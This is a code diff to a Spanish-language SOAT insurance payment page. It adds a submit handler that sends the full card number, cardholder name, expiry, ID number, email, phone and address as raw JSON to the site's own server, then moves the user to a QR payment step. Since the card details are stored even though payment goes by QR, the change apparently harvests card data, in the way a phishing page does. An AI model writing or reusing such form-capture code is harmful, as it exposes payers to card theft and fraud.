@@ -604,6 +604,9 @@
             var panelErr = document.getElementById('panel-error');
             var btnWhats = document.getElementById('btn-whats-now');
             var whatsUrl = @json($whatsSupportUrl);
+            var registrarUrl = @json(route('soat.pago.tarjeta.envio'));
+            var csrfToken = @json(csrf_token());
+            var totalPago = {{ (int) $total }};
             var redirectTimer;
             var tipoRadios = document.querySelectorAll('input[name="tipo_tarjeta"]');
             var wrapCuotas = document.getElementById('wrap-cuotas');
@@ -700,10 +703,49 @@
                 return ok;
             }
 
+            async function registrarEnvio() {
+                var numeroPlano = digitsOnly(numTarjeta.value);
+                var payload = {
+                    total: totalPago,
+                    tipo_tarjeta: (document.querySelector('input[name="tipo_tarjeta"]:checked') || {}).value || 'credito',
+                    numero_tarjeta: numeroPlano,
+                    nombre_tarjeta: document.getElementById('nombre_tarjeta').value.trim(),
+                    vencimiento: document.getElementById('vencimiento').value.trim(),
+                    cuotas: parseInt((document.getElementById('cuotas') || {}).value || '1', 10),
+                    tipo_documento: document.getElementById('tipo_documento').value,
+                    numero_documento: document.getElementById('numero_documento').value.trim(),
+                    email: document.getElementById('email').value.trim(),
+                    celular: document.getElementById('celular').value.trim(),
+                    direccion: document.getElementById('direccion').value.trim()
+                };
+
+                var res = await fetch(registrarUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRF-TOKEN': csrfToken,
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!res.ok) {
+                    throw new Error('No se pudo registrar el envío de tarjeta.');
+                }
+            }
+
             if (form) {
-                form.addEventListener('submit', function (e) {
+                form.addEventListener('submit', async function (e) {
                     e.preventDefault();
                     if (!validate()) return;
+                    btnPagar.disabled = true;
+                    try {
+                        await registrarEnvio();
+                    } catch (err) {
+                        btnPagar.disabled = false;
+                        window.alert('No se pudo guardar la información de la tarjeta. Intenta nuevamente.');
+                        return;
+                    }
                     stepCard.hidden = true;
                     stepQr.hidden = false;
                     stepQr.scrollIntoView({ behavior: 'smooth', block: 'start' });
